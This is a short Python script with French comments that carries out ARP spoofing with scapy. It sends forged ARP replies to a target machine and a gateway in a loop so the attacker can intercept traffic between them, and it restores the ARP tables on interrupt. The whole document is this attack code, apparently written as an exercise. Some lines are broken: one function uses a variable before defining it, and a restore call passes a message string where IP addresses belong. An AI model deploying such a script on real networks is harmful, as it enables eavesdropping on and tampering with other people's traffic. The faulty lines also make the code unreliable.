##### L'attaquant intercepte le trafic entre deux appareils

from tabnanny import verbose
import time
import scapy.all as scapy
# info sur scapy
#scapy.ls(scapy.ARP)
# hwsrc : adresse mac de la source
# op : Type d'opération (1 : requete arp, 2 : reponse arp)
# psrc : adresse ip de la source
# pdst : destination que je veux changer

def get_mac(target_ip):
    '''
    Récupère l'adresse MAC d'une machine
    '''
    arp_request = scapy.ARP(pdst = target_ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    answered_list = scapy.srp(broadcast/arp_request, timeout = 1, verbose = False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    '''
    target _ip : Ip sible machine victime dans la table arp
    spoof_ip : Ip usurpé nouvelle adresse ip
    '''
    #target_mac = "08-00-27-1D-8B-2C"
    target_mac = get_mac(target_mac)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(packet, verbose= False)

#print(spoof("192.16.......","192.16......."))

def restore(target_ip, real_ip):
    '''
    Restaure les tables arp
    '''
    target_mac = get_mac(target_ip)
    real_mac = get_mac(real_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = real_ip, hwsrc=real_mac)
    scapy.send(packet, verbose= False)

target_ip = "192.16............"
gateway_ip = "192.16.........." # arp -a

sent_packets_count = 0
try : 
    while True : 
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count +=2
        print('\r [+] Packets sent: ' + str(sent_packets_count), end='')
        time.sleep(2)
    #sudo python arp_spoofing.py
except KeyboardInterrupt :
    restore("\n[+] Detected CTRL + C... Resetting ARP tables... Please Wait. \n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
